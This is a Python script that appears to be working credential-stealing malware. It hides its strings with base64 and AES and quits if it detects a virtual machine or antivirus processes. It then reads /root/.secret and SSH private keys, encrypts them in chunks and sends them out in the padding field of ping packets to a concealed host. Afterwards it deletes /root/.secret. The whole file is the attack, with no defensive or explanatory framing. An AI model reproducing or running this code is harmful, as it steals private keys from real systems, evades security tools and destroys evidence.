import os, subprocess
import psutil
import base64
from Crypto.Cipher import AES
__k = bytes.fromhex('e8f93d68b1c2d4e9f7a36b5c8d0f1e2a')
__v = bytes.fromhex('1f2d3c4b5a69788766554433221100ff')
__d = '37e0f8f92c71f1c3f047f43c13725ef1'

# decode base64
def __b64d(s):
    return base64.b64decode(s.encode()).decode()

# padding
def __p(x):
    return x + bytes([16 - len(x) % 16]) * (16 - len(x) % 16)

def __u(x):
    return x[:-x[-1]]

# decrypt AES and decode base64
def __x(h):
    c = AES.new(__k, AES.MODE_CBC, __v)
    return __u(c.decrypt(bytes.fromhex(h))).decode()

# encrypt AES and encode base64
def __y(s):
    c = AES.new(__k, AES.MODE_CBC, __v)
    return c.encrypt(__p(s.encode())).hex()

# check if it's a VM
def __chk_vm():
    try:
        z = open('/sys/class/dmi/id/product_name').read().strip().lower()
        for q in [b'VmlydHVhbEJveA==', b'S1ZN', b'UVFNVQ==', b'Qm9jaHM=']:
            if base64.b64decode(q).decode().lower() in z:
                print('ERR VM')
                return True
    except:
        pass
    return False

# Check anti-virus
def __chk_av():
    targets = [b'Y2xhbWQ=', b'YXZnZA==', b'c29waG9z', b'RVNFVA==', b'cmtodW50ZXI=']
    try:
        for p in psutil.process_iter(attrs=['name']):
            n = (p.info['name'] or '').lower()
            for b64av in targets:
                if base64.b64decode(b64av).decode().lower() in n:
                    print('ERR AV')
                    return True
    except:
        pass
    return False

# exfiltration of the data with the command ping
def __exf(path, dst, size=15):
    if not os.path.exists(path):
        return False
    d = open(path, 'rb').read()
    segs = [d[i:i + size] for i in range(0, len(d), size)]
    for seg in segs:
        try:
            payload = AES.new(__k, AES.MODE_CBC, __v).encrypt(__p(seg)).hex()
            cmd = [__b64d('cGluZw=='), __b64d('LWM='), __b64d('MQ=='), __b64d('LXA='), payload, dst]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            continue
    return True

def __main():
    if __chk_vm():
        return
    if __chk_av():
        return
    __kll = ['/root/.secret', os.path.expanduser('~/.ssh/id_rsa'), '/root/.ssh/id_rsa']
    for f in __kll:
        if os.path.exists(f):
            __exf(f, __x(__d))
    _kkoo = '/root/.secret'
    if os.path.exists(_kkoo):
        try:
            os.remove(_kkoo)
        except Exception as e:
            pass
if __name__ == '__main__':
    __main()